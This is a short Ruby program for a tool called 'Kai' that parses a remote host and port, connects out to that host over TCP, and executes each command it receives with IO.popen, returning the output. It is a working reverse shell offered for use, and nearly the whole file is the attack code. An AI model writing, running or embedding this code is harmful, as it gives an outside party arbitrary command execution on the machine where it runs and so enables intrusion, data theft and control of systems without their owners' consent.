# Copyright 2023 ShRP <braindisassemblue@gmail.com>

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

require 'ostruct'
require 'optparse'
require 'socket'

class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
end

class Kai

  puts '------------------------------------------------------------------------'.green
  puts '                           __           .__                             '.green
  puts '                          |  | _______  |__|                            '.green
  puts '                          |  |/ /\__  \ |  |                            '.green
  puts '                          |    <  / __ \|  |                            '.green
  puts '                          |__|_ \(____  /__|                            '.green
  puts '                               \/     \/                                '.green
  puts '------------------------------------------------------------------------'.green

  Version = 'Version => Kai v0.1 Copyright 2023 ShRP <braindisassemblue@gmail.cm>'.green
  
  def parser(arguments)
    ARGV << '-h' if ARGV.empty?
    @options = OpenStruct.new

    OptionParser.new do |opts|
      opts.banner = "Usage: #{__FILE__} [options]"

      opts.on('-r', '--rhost ', String,
        'Specify the host to connect to') do |rhost|
        @options.rhost = rhost
      end

      opts.on('-p', '--port ', Integer, 
        'Specify the TCP port') do |port|
        @options.port = port
      end

      opts.on('-V', '--version', 'Show version and exit') do
        puts Version
        exit
      end

      opts.on('-h', '--help', 'Show help and exit') do
        puts opts
        exit
      end
    end.parse!(arguments)

    if @options.port.nil?
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + "No port specified to #{@options.port}"
      puts '------------------------------------------------------------------------'.red
      puts "[!] ".red + 'Exiting ..'
      puts '------------------------------------------------------------------------'.red
      exit
    end
  rescue OptionParser::ParseError => err
    puts '------------------------------------------------------------------------'.red
    puts "[!] ".red + err.message.to_s
    puts '------------------------------------------------------------------------'.red
    puts "[!] ".red + 'Exiting ..'
    puts '------------------------------------------------------------------------'.red
    exit
  end


def connect
      socket = nil
      begin
        socket = TCPSocket.new(@options.rhost, @options.port)
      rescue SocketError, Errno::EHOSTUNREACH, Errno::ECONNREFUSED => err
        puts '------------------------------------------------------------------------'.red
        puts "[!] ".red + "Error [1]: #{err}"
        puts '------------------------------------------------------------------------'.red
        puts "[!] ".red + 'Exiting ..'
        puts '------------------------------------------------------------------------'.red
        exit
      rescue Errno::ETIMEDOUT, Errno::ENETUNREACH => err
        puts '------------------------------------------------------------------------'.red
        puts "[!] ".red + "Error [2]: #{err}"
        puts '------------------------------------------------------------------------'.red
        puts "[!] ".red + 'Exiting ..'
        puts '------------------------------------------------------------------------'.red
        exit
      end

      puts "[*] Starting at: (#{Time.now}) Operating System: (#{RUBY_PLATFORM})"
      puts '------------------------------------------------------------------------'.green
      puts "[*] Status: (Connection Established!)"
      puts "[*] Remote Host: (#{@options.rhost}) Remote Port: (#{@options.port})"
      puts '------------------------------------------------------------------------'.green
      puts "[*] Exiting at: (#{Time.now})"
      puts '------------------------------------------------------------------------'.green

      while (cmd = socket.gets)
        IO.popen(cmd, 'r') { |io| socket.print io.read }
      end
    end

  def run(arguments)
    parser(arguments)
    connect
  end
end

shell = Kai.new
shell.run(ARGV)
